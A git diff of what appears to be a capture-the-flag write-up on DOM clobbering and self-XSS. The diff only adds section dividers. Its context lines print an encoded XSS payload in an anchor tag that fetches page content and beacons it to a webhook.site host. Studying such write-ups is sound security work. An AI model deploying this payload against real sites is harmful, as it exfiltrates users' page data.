@@ -105,6 +105,8 @@ If we navigate to index.html via the static route `/static/index.html`, `clients
 
 ![Relative path fails to load](/static/img/posts/2025-pwnsec-web-pspd/relative.webp)
 
+---
+
 ## 4. DOM Clobber
 
 Once we navigate to `/static/index.html?user-id=OUR_USER_ID`, only `clientsideUIDFallback.js` will load. Sadly, `userData` was assigned only in `loadUserData.js` so we can't perform the self XSS directly. Let's analyze further what's happening when we visit the page using `/static/index.html?user-id=OUR_USER_ID`.
@@ -210,6 +212,8 @@ Given `a` element like this:
 ```html
 <a href="https://%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27ZmV0Y2goJy8nKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGI9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCdodHRwOi8vNTE2NTNmM2YtYTVhNi00Y2RiLWE3YTctNWQwZmIwNWIwZDNjLndlYmhvb2suc2l0ZScsYikp%27%29%29%20%2F%3E@x.com" id="userData"></a>
 ```
+
+---
 
 ## 5. Exploit Plan
 
